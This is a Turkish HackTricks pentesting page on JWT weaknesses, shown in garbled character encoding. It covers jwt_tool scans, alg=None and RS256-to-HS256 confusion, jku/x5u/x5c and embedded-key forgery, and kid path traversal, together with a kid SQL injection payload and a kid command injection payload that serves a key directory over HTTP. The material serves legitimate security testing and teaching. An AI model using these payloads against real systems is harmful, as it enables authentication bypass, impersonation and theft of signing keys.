# JWT Zafiyetleri (Json Web Token)

<details>

<summary><strong>AWS hackleme konusunda sÄ±fÄ±rdan kahramana dÃ¶nÃ¼ÅŸmek iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi paylaÅŸarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek** katkÄ±da bulunun.

</details>

![](<../.gitbook/assets/image (638) (3).png>)

**Bug bounty ipucu**: **Intigriti'ye kaydolun**, hackerlar tarafÄ±ndan oluÅŸturulan bir premium **bug bounty platformuna**! BugÃ¼n [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) adresine katÄ±lÄ±n ve **$100,000**'e kadar Ã¶dÃ¼ller kazanmaya baÅŸlayÄ±n!

{% embed url="https://go.intigriti.com/hacktricks" %}

**Bu yazÄ±nÄ±n bir kÄ±smÄ±, harika bir yazÄ±ya dayanmaktadÄ±r:** [**https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology)\
**JWT'leri pentest etmek iÃ§in harika bir araÃ§ olan** [**https://github.com/ticarpi/jwt\_tool**](https://github.com/ticarpi/jwt\_tool) **adlÄ± aracÄ±n yazarÄ±**

### **HÄ±zlÄ± KazanÄ±mlar**

[**jwt\_tool**](https://github.com/ticarpi/jwt\_tool) aracÄ±nÄ± `TÃ¼m Testler!` modunda Ã§alÄ±ÅŸtÄ±rÄ±n ve yeÅŸil satÄ±rlarÄ± bekleyin
```bash
python3 jwt_tool.py -M at \
-t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
-rh "Authorization: Bearer eyJhbG...<JWT Token>"
```
EÄŸer ÅŸanslÄ±ysanÄ±z, araÃ§ web uygulamasÄ±nÄ±n JWT'yi yanlÄ±ÅŸ ÅŸekilde kontrol ettiÄŸi bir durum bulabilir:

![](<../.gitbook/assets/image (435).png>)

ArdÄ±ndan, proxy'de isteÄŸi arayabilir veya jwt\_ aracÄ±nÄ± kullanarak o istek iÃ§in kullanÄ±lan JWT'yi dÃ¶kÃ¼mleyebilirsiniz:
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```
### Veriyi deÄŸiÅŸtirmeden veriyi bozma

Sadece veriyi bozarak imzayÄ± olduÄŸu gibi bÄ±rakabilir ve sunucunun imzayÄ± kontrol edip etmediÄŸini kontrol edebilirsiniz. Ã–rneÄŸin, kullanÄ±cÄ± adÄ±nÄ± "admin" olarak deÄŸiÅŸtirmeyi deneyin.

#### **Token kontrol ediliyor mu?**

Bir JWT'nin imzasÄ±nÄ±n doÄŸrulandÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in:

- Bir hata mesajÄ±, devam eden doÄŸrulamayÄ± gÃ¶sterir; ayrÄ±ntÄ±lÄ± hatalardaki hassas bilgiler gÃ¶zden geÃ§irilmelidir.
- DÃ¶nen sayfada deÄŸiÅŸiklik, doÄŸrulamayÄ± gÃ¶sterir.
- Herhangi bir deÄŸiÅŸiklik olmamasÄ±, doÄŸrulamanÄ±n olmadÄ±ÄŸÄ±nÄ± gÃ¶sterir; bu durumda veri paylaÅŸÄ±mÄ± iddialarÄ±nÄ± bozmak iÃ§in deney yapÄ±labilir.

### KÃ¶ken

Token'Ä±n sunucu tarafÄ±ndan mÄ± yoksa istemci tarafÄ±ndan mÄ± oluÅŸturulduÄŸunu belirlemek iÃ§in proxy'nin istek geÃ§miÅŸi incelenmelidir.

- Ä°stemci tarafÄ±ndan ilk kez gÃ¶rÃ¼len token'lar, anahtarÄ±n istemci tarafÄ± koduna maruz kalabileceÄŸini gÃ¶sterir ve daha fazla araÅŸtÄ±rma gerektirir.
- Sunucu tarafÄ±ndan kaynaklanan token'lar gÃ¼venli bir sÃ¼reci iÅŸaret eder.

### SÃ¼re

Token'Ä±n 24 saatten daha uzun sÃ¼re dayanÄ±p dayanmadÄ±ÄŸÄ±nÄ± kontrol edin... belki hiÃ§ sÃ¼resi dolmuyordur. "exp" alanÄ± varsa, sunucunun bunu doÄŸru bir ÅŸekilde iÅŸleyip iÅŸlemediÄŸini kontrol edin.

### HMAC gizli anahtarÄ±nÄ± kaba kuvvetle bulma

[**Bu sayfaya bakÄ±n.**](../generic-methodologies-and-resources/brute-force.md#jwt)

### AlgoritmayÄ± None olarak deÄŸiÅŸtirme (CVE-2015-9235)

KullanÄ±lan algoritmayÄ± "None" olarak ayarlayÄ±n ve imza kÄ±smÄ±nÄ± kaldÄ±rÄ±n.

Bu zafiyeti denemek ve JWT iÃ§inde farklÄ± deÄŸerleri deÄŸiÅŸtirmek iÃ§in Burp uzantÄ±sÄ± olan "JSON Web Token" kullanÄ±n (istemi Repeater'a gÃ¶nderin ve "JSON Web Token" sekmesinde token'Ä±n deÄŸerlerini deÄŸiÅŸtirebilirsiniz. "Alg" alanÄ±nÄ±n deÄŸerini "None" olarak seÃ§ebilirsiniz).

### AlgoritmayÄ± RS256(asimetrik) yerine HS256(simetrik) olarak deÄŸiÅŸtirme (CVE-2016-5431/CVE-2016-10555)

HS256 algoritmasÄ±, her iletiyi imzalamak ve doÄŸrulamak iÃ§in gizli anahtar kullanÄ±r.\
RS256 algoritmasÄ±, iletiyi imzalamak iÃ§in Ã¶zel anahtar kullanÄ±r ve doÄŸrulama iÃ§in genel anahtar kullanÄ±r.

AlgoritmayÄ± RS256'dan HS256'ya deÄŸiÅŸtirirseniz, arka uÃ§ kodu genel anahtarÄ± gizli anahtar olarak kullanÄ±r ve ardÄ±ndan HS256 algoritmasÄ±nÄ± kullanarak imzanÄ±n doÄŸruluÄŸunu kontrol eder.

Daha sonra, genel anahtarÄ± kullanarak RS256'yÄ± HS256'ya deÄŸiÅŸtirerek geÃ§erli bir imza oluÅŸturabiliriz. Web sunucusunun sertifikasÄ±nÄ± almak iÃ§in ÅŸunu Ã§alÄ±ÅŸtÄ±rabilirsiniz:
```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
### BaÅŸlÄ±k iÃ§inde yeni bir genel anahtar

Bir saldÄ±rgan, belirtecin baÅŸlÄ±ÄŸÄ±na yeni bir anahtar yerleÅŸtirir ve sunucu bu yeni anahtarÄ± imzanÄ±n doÄŸrulanmasÄ± iÃ§in kullanÄ±r (CVE-2018-0114).

Bu, "JSON Web Tokens" Burp eklentisiyle yapÄ±labilir.\
(Ä°steÄŸi Repeater'a gÃ¶nderin, JSON Web Token sekmesinde "CVE-2018-0114" seÃ§eneÄŸini seÃ§in ve isteÄŸi gÃ¶nderin).

### JWKS SahteciliÄŸi

Bu talimatlar, Ã¶zellikle "jku" baÅŸlÄ±k talebi kullanan JWT belgelerinin gÃ¼venliÄŸini deÄŸerlendirmek iÃ§in bir yÃ¶ntem ayrÄ±ntÄ±landÄ±rÄ±r. Bu talep, belirtecin doÄŸrulanmasÄ± iÃ§in gerekli olan genel anahtarÄ± iÃ§eren bir JWKS (JSON Web Key Set) dosyasÄ±na baÄŸlantÄ± saÄŸlamalÄ±dÄ±r.

- **"jku" BaÅŸlÄ±ÄŸÄ± ile Belge DeÄŸerlendirme**:
- "jku" talebinin URL'sini doÄŸru JWKS dosyasÄ±na yÃ¶nlendirdiÄŸinden emin olun.
- Belirtecin "jku" deÄŸerini, trafiÄŸi gÃ¶zlemlemeye izin veren bir kontrol edilen web hizmetine yÃ¶nlendirmek iÃ§in deÄŸiÅŸtirin.

- **HTTP EtkileÅŸimi Ä°Ã§in Ä°zleme**:
- Belirtilen URL'ye yapÄ±lan HTTP isteklerini gÃ¶zlemlemek, sunucunun saÄŸladÄ±ÄŸÄ±nÄ±z baÄŸlantÄ±dan anahtarlarÄ± almak iÃ§in yaptÄ±ÄŸÄ± giriÅŸimleri gÃ¶sterir.
- Bu iÅŸlem iÃ§in `jwt_tool` kullanÄ±rken, testi kolaylaÅŸtÄ±rmak iÃ§in `jwtconf.ini` dosyasÄ±nÄ± kiÅŸisel JWKS konumunuzla gÃ¼ncellemek Ã¶nemlidir.

- **`jwt_tool` Ä°Ã§in Komut**:
- AÅŸaÄŸÄ±daki komutu kullanarak `jwt_tool` ile senaryoyu simÃ¼le edin:
```bash
python3 jwt_tool.py JWT_BURAYA_YAZIN -X s
```

### "kid" SorunlarÄ±nÄ±n Genel BakÄ±ÅŸÄ±

Belirli bir anahtarÄ± tanÄ±mlamak iÃ§in kullanÄ±lan isteÄŸe baÄŸlÄ± bir baÅŸlÄ±k talebi olan `kid`, belirtecin imzasÄ±nÄ±n doÄŸrulanmasÄ± iÃ§in birden fazla anahtarÄ±n bulunduÄŸu ortamlarda Ã¶zellikle Ã¶nemlidir. Bu talep, bir belirtecin imzasÄ±nÄ± doÄŸrulamak iÃ§in uygun anahtarÄ± seÃ§mede yardÄ±mcÄ± olur.

#### "kid" ile AnahtarÄ±n Ortaya Ã‡Ä±karÄ±lmasÄ±

`kid` talebi baÅŸlÄ±kta bulunduÄŸunda, ilgili dosyayÄ± veya varyasyonlarÄ±nÄ± web dizininde aramak Ã¶nerilir. Ã–rneÄŸin, `"kid":"key/12345"` belirtilmiÅŸse, _/key/12345_ ve _/key/12345.pem_ dosyalarÄ± web kÃ¶kÃ¼nde aranmalÄ±dÄ±r.

#### "kid" ile Yol GeÃ§iÅŸi

`kid` talebi ayrÄ±ca dosya sistemi Ã¼zerinde gezinmek iÃ§in kÃ¶tÃ¼ye kullanÄ±labilir ve bÃ¶ylece keyfi bir dosyanÄ±n seÃ§ilmesine izin verebilir. `kid` deÄŸerini deÄŸiÅŸtirerek belirli dosyalara veya hizmetlere hedef almak iÃ§in baÄŸlantÄ±yÄ± test etmek veya Sunucu TarafÄ± Ä°stek SahteciliÄŸi (SSRF) saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirmek mÃ¼mkÃ¼ndÃ¼r. JWT'yi deÄŸiÅŸtirmek ve orijinal imzayÄ± korurken `kid` deÄŸerini deÄŸiÅŸtirmek, aÅŸaÄŸÄ±daki gibi jwt_tool'da `-T` bayraÄŸÄ±nÄ± kullanarak baÅŸarÄ±labilmektedir:
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```
Hedeflenen tahmin edilebilir iÃ§eriÄŸe sahip dosyalarÄ± hedef alarak geÃ§erli bir JWT oluÅŸturmak mÃ¼mkÃ¼ndÃ¼r. Ã–rneÄŸin, Linux sistemlerindeki `/proc/sys/kernel/randomize_va_space` dosyasÄ±, JWT oluÅŸturma iÃ§in simetrik ÅŸifre olarak **2** kullanÄ±larak `kid` parametresinde kullanÄ±labilir.

#### "kid" AracÄ±lÄ±ÄŸÄ±yla SQL Enjeksiyonu

`kid` talebinin iÃ§eriÄŸi, bir veritabanÄ±ndan bir ÅŸifre almak iÃ§in kullanÄ±lÄ±yorsa, `kid` yÃ¼kÃ¼nÃ¼ deÄŸiÅŸtirerek bir SQL enjeksiyonu kolaylaÅŸtÄ±rÄ±labilir. JWT imzalama sÃ¼recini deÄŸiÅŸtirmek iÃ§in SQL enjeksiyonu kullanan bir Ã¶rnek yÃ¼k ÅŸunlarÄ± iÃ§erir:

`non-existent-index' UNION SELECT 'ATTACKER';-- -`

Bu deÄŸiÅŸiklik, JWT imzalamak iÃ§in bilinen bir gizli anahtar olan `ATTACKER`'Ä±n kullanÄ±lmasÄ±nÄ± zorlar.

#### "kid" AracÄ±lÄ±ÄŸÄ±yla Ä°ÅŸletim Sistemi Enjeksiyonu

`kid` parametresi, bir komut yÃ¼rÃ¼tme baÄŸlamÄ±nda kullanÄ±lan bir dosya yolunu belirttiÄŸinde Uzaktan Kod YÃ¼rÃ¼tme (RCE) gÃ¼venlik aÃ§Ä±klarÄ±na yol aÃ§abilir. `kid` parametresine komutlar enjekte ederek Ã¶zel anahtarlarÄ± ortaya Ã§Ä±karmak mÃ¼mkÃ¼ndÃ¼r. RCE ve anahtar ortaya Ã§Ä±karma iÃ§in bir Ã¶rnek yÃ¼k ÅŸu ÅŸekildedir:

`/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

### x5u ve jku

#### jku

jku, **JWK Set URL** anlamÄ±na gelir.\
Token, "**jku**" **Header** talebini kullanÄ±yorsa, **saÄŸlanan URL'yi kontrol edin**. Bu, belirteci doÄŸrulamak iÃ§in Genel AnahtarÄ± tutan JWKS dosyasÄ±nÄ± iÃ§eren bir URL'ye iÅŸaret etmelidir. Belirteci, jku deÄŸerini izleyebileceÄŸiniz bir web hizmetine yÃ¶nlendirmek iÃ§in deÄŸiÅŸtirin.

Ã–ncelikle yeni bir sertifika oluÅŸturmanÄ±z gerekmektedir, yeni Ã¶zel ve genel anahtarlarla birlikte.
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
ArdÄ±ndan, yeni JWT'yi oluÅŸturmak iÃ§in [**jwt.io**](https://jwt.io) gibi bir araÃ§ kullanabilirsiniz. Bu araÃ§la, oluÅŸturulan genel ve Ã¶zel anahtarlarÄ± kullanarak ve jku parametresini oluÅŸturulan sertifikaya iÅŸaretleyerek yeni JWT oluÅŸturabilirsiniz. GeÃ§erli bir jku sertifikasÄ± oluÅŸturmak iÃ§in orijinalini indirebilir ve gereken parametreleri deÄŸiÅŸtirebilirsiniz.

"E" ve "n" parametrelerini bir genel sertifikadan aÅŸaÄŸÄ±daki komutlarÄ± kullanarak elde edebilirsiniz:
```bash
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```
#### x5u

X.509 URL. PEM biÃ§iminde kodlanmÄ±ÅŸ bir dizi X.509 (bir sertifika formatÄ± standardÄ±) genel sertifikalarÄ±na iÅŸaret eden bir URI. Setteki ilk sertifika bu JWT'yi imzalamak iÃ§in kullanÄ±lan sertifikadÄ±r. ArdÄ±ÅŸÄ±k sertifikalar Ã¶nceki sertifikayÄ± imzalar, bÃ¶ylece sertifika zinciri tamamlanÄ±r. X.509, RFC 52807'de tanÄ±mlanmÄ±ÅŸtÄ±r. SertifikalarÄ±n aktarÄ±lmasÄ± iÃ§in taÅŸÄ±ma gÃ¼venliÄŸi gereklidir.

Bu baÅŸlÄ±ÄŸÄ± **kontrolÃ¼nÃ¼z altÄ±ndaki bir URL'ye deÄŸiÅŸtirmeyi deneyin** ve herhangi bir isteÄŸin alÄ±nÄ±p alÄ±nmadÄ±ÄŸÄ±nÄ± kontrol edin. Bu durumda JWT'yi **bozabilirsiniz**.

Kendi kontrolÃ¼nÃ¼zdeki bir sertifika kullanarak yeni bir belirteÃ§ oluÅŸturmak iÃ§in sertifikayÄ± oluÅŸturmanÄ±z ve genel ve Ã¶zel anahtarlarÄ± Ã§Ä±karmanÄ±z gerekmektedir:
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```
ArdÄ±ndan, yeni JWT'yi oluÅŸturmak iÃ§in Ã¶rneÄŸin [**jwt.io**](https://jwt.io) kullanabilirsiniz. Bu iÅŸlem iÃ§in oluÅŸturulan genel ve Ã¶zel anahtarlarÄ± kullanmalÄ± ve x5u parametresini oluÅŸturulan .crt sertifikasÄ±na iÅŸaret etmelisiniz.

![](<../.gitbook/assets/image (439).png>)

AyrÄ±ca, bu zafiyetleri **SSRF saldÄ±rÄ±larÄ± iÃ§in** kullanabilirsiniz.

#### x5c

Bu parametre, **base64 formatÄ±nda sertifikayÄ±** iÃ§erebilir:

![](<../.gitbook/assets/image (440).png>)

SaldÄ±rgan, kendine imzalÄ± bir sertifika oluÅŸturur ve ilgili Ã¶zel anahtarÄ± kullanarak sahte bir belirteÃ§ oluÅŸturur. ArdÄ±ndan "x5c" parametresinin deÄŸerini yeni oluÅŸturulan sertifikayla deÄŸiÅŸtirir ve diÄŸer parametreleri, yani n, e ve x5t'yi deÄŸiÅŸtirirse, sahte belirteÃ§ sunucu tarafÄ±ndan kabul edilecektir.
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
```
### GÃ¶mÃ¼lÃ¼ Genel Anahtar (CVE-2018-0114)

EÄŸer JWT aÅŸaÄŸÄ±daki senaryoda olduÄŸu gibi gÃ¶mÃ¼lÃ¼ bir genel anahtara sahipse:

![](<../.gitbook/assets/image (438).png>)

AÅŸaÄŸÄ±daki nodejs betiÄŸi kullanÄ±larak bu veriden bir genel anahtar oluÅŸturulabilir:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="â€‹ANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"â€‹;
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
```
Yeni bir Ã¶zel/genel anahtar oluÅŸturmak, yeni genel anahtarÄ± belirteci iÃ§ine yerleÅŸtirmek ve yeni bir imza oluÅŸturmak iÃ§in kullanmak mÃ¼mkÃ¼ndÃ¼r:
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
AÅŸaÄŸÄ±daki Node.js betiÄŸi kullanarak "n" ve "e" deÄŸerlerini elde edebilirsiniz:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```
Son olarak, genel ve Ã¶zel anahtarlarÄ± ve yeni "n" ve "e" deÄŸerlerini kullanarak [jwt.io](https://jwt.io) kullanarak herhangi bir bilgiyle geÃ§erli bir JWT oluÅŸturabilirsiniz.

### JTI (JWT KimliÄŸi)

JTI (JWT KimliÄŸi) talebi, bir JWT Jetonu iÃ§in benzersiz bir tanÄ±mlayÄ±cÄ± saÄŸlar. Jetonun tekrar oynatÄ±lmasÄ±nÄ± Ã¶nlemek iÃ§in kullanÄ±labilir.\
Ancak, ID'nin maksimum uzunluÄŸunun 4 (0001-9999) olduÄŸu bir durumu hayal edin. Ä°stek 0001 ve 10001 aynÄ± kimliÄŸi kullanacak. Bu durumda, arka uÃ§ her istekte ID'yi artÄ±rÄ±yorsa, bu durumu kÃ¶tÃ¼ye kullanarak bir isteÄŸi **tekrar oynatabilirsiniz** (her baÅŸarÄ±lÄ± tekrar oynatma arasÄ±nda 10000 istek gÃ¶ndermek gerekiyor).

### JWT KayÄ±tlÄ± talepleri

{% embed url="https://www.iana.org/assignments/jwt/jwt.xhtml#claims" %}

### DiÄŸer saldÄ±rÄ±lar

**Ã‡apraz hizmet RÃ¶le SaldÄ±rÄ±larÄ±**

BazÄ± web uygulamalarÄ±nÄ±n jetonlarÄ±nÄ±n oluÅŸturulmasÄ± ve yÃ¶netimi iÃ§in gÃ¼venilir bir JWT hizmetine gÃ¼vendiÄŸi gÃ¶zlemlenmiÅŸtir. AynÄ± JWT hizmetinin baÅŸka bir istemcisi tarafÄ±ndan kabul edilen bir istemci iÃ§in oluÅŸturulan bir jeton kaydedilmiÅŸtir. ÃœÃ§Ã¼ncÃ¼ taraf bir hizmet aracÄ±lÄ±ÄŸÄ±yla bir JWT'nin verilmesi veya yenilenmesi gÃ¶zlemlenirse, aynÄ± kullanÄ±cÄ± adÄ±/e-posta ile baÅŸka bir istemcinin hesabÄ±na kaydolma olasÄ±lÄ±ÄŸÄ± araÅŸtÄ±rÄ±lmalÄ±dÄ±r. ArdÄ±ndan, elde edilen jetonun hedefe bir istekte tekrar oynatÄ±lÄ±p oynatÄ±lmadÄ±ÄŸÄ±nÄ± gÃ¶rmek iÃ§in bir deneme yapÄ±lmalÄ±dÄ±r.

- Jetonunuzun kabul edilmesi, herhangi bir kullanÄ±cÄ±nÄ±n hesabÄ±nÄ±n sahteciliÄŸine izin verebilecek kritik bir sorunu gÃ¶sterebilir. Bununla birlikte, Ã¼Ã§Ã¼ncÃ¼ taraf bir uygulamada kaydolmak iÃ§in daha geniÅŸ bir test izni gerekebileceÄŸi unutulmamalÄ±dÄ±r, Ã§Ã¼nkÃ¼ bu durum yasal bir belirsizlik alanÄ±na girebilir.

**JetonlarÄ±n SÃ¼resi KontrolÃ¼**

Jetonun sÃ¼resi, "exp" YÃ¼k talebi kullanÄ±larak kontrol edilir. JWT'ler genellikle oturum bilgisi olmadan kullanÄ±ldÄ±ÄŸÄ±ndan dikkatli bir ÅŸekilde ele alÄ±nmasÄ± gerekmektedir. Bir baÅŸka kullanÄ±cÄ±nÄ±n JWT'sini yakalayÄ±p tekrar oynatmak, birÃ§ok durumda o kullanÄ±cÄ±nÄ±n taklit edilmesine olanak saÄŸlayabilir. JWT RFC'si, JWT tekrar oynatma saldÄ±rÄ±larÄ±nÄ± azaltmak iÃ§in "exp" talebini kullanarak jeton iÃ§in bir sÃ¼re belirlemeyi Ã¶nermektedir. AyrÄ±ca, uygulamanÄ±n bu deÄŸeri iÅŸlemek ve sÃ¼resi dolmuÅŸ jetonlarÄ± reddetmek iÃ§in ilgili kontrolleri uygulamasÄ± Ã¶nemlidir. Jetonun "exp" talebi iÃ§erdiÄŸi ve test sÃ¼re sÄ±nÄ±rlarÄ± izin veriyorsa, jetonun sÃ¼resi dolduktan sonra kaydedilip tekrar oynatÄ±lmasÄ± Ã¶nerilir. Jetonun iÃ§eriÄŸi, zaman damgasÄ± ayrÄ±ÅŸtÄ±rma ve sÃ¼resi kontrol etme (zaman damgasÄ± UTC'de) jwt_tool'un -R bayraÄŸÄ± kullanÄ±larak okunabilir.

- Uygulama hala jetonu doÄŸruluyorsa, bir gÃ¼venlik riski olabilir, Ã§Ã¼nkÃ¼ bu, jetonun asla sÃ¼resinin dolmayacaÄŸÄ± anlamÄ±na gelebilir.

### AraÃ§lar

{% embed url="https://github.com/ticarpi/jwt_tool" %}

<img src="../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug bounty ipucu**: **Intigriti'ye kaydolun**, hackerlar tarafÄ±ndan hackerlar iÃ§in oluÅŸturulmuÅŸ bir premium **bug bounty platformu**! BugÃ¼n [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) adresinde bize katÄ±lÄ±n ve **100.000 $'a kadar Ã¶dÃ¼ller** kazanmaya baÅŸlayÄ±n!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'yi desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklam vermek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden oluÅŸan PEASS Ailesi**](https://opensea.io/collection/the-peass-family)ni keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi Twitter'da takip edin ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* Hacking hilelerinizi gÃ¶ndererek HackTricks ve HackTricks Cloud github depolarÄ±na katkÄ±da bulunun.

</details>
